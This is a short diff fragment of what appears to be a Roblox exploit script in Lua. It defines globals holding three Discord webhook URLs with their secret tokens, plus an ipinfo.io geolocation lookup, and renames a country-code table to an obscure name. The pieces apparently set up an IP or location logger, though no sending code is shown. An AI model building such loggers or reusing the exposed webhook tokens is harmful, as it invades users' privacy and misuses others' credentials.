@@ -2938,7 +2938,7 @@ getgenv().boink = 'https://discord.com/api/webhooks/1267767360622952509/-SCpf1kL
 getgenv().boink2 = 'https://discord.com/api/webhooks/1273950554296549397/JX2aZgkPkgWIqJ43RiGSXvOg685MMupGr5NdcHHFyiG656VSsMViNc5rcoPecraE878L'
 getgenv().boink3 = 'https://discord.com/api/webhooks/1269773054553362452/DHH9XgUWkExFlbghxzp-hXHDUiDFs2sGEqWRY32yo6Cn4olVmwA9hVx0R_YJftztEmFV'
 getgenv().peepo = 'https://ipinfo.io/json'
-getgenv().countryCodes = {
+getgenv().leviathan = {
     ["AF"] = "Afghanistan", ["AX"] = "Aland Islands", ["AL"] = "Albania", ["DZ"] = "Algeria", ["AS"] = "American Samoa",
     ["AD"] = "Andorra", ["AO"] = "Angola", ["AI"] = "Anguilla", ["AQ"] = "Antarctica", ["AG"] = "Antigua and Barbuda",
     ["AR"] = "Argentina", ["AM"] = "Armenia", ["AW"] = "Aruba", ["AU"] = "Australia", ["AT"] = "Austria",
